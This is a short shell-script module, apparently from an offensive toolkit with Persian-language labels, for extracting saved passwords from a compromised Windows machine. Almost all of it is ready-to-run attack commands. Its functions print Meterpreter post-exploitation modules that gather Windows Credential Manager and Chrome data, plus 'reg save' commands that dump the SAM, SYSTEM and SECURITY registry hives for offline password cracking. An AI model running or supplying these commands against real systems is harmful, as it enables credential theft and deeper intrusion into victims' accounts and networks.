DESC="استخراج رمزهای ذخیره‌شده در ویندوز"
REQ="session فعال"
RISK="HIGH"
NOTE="credential manager و مرورگرها؛ نیاز به SYSTEM دارد"

termux(){ echo "# داخل meterpreter: run post/windows/gather/credentials/credential_collector"; }

kali(){
cat <<'EOF'
# داخل meterpreter:
run post/windows/gather/credentials/credential_collector
run post/windows/gather/enum_chrome
run post/windows/gather/enum_applications

# یا دستی:
reg save HKLM\\SAM sam.hiv
reg save HKLM\\SYSTEM sys.hiv
reg save HKLM\\SECURITY sec.hiv
EOF
}
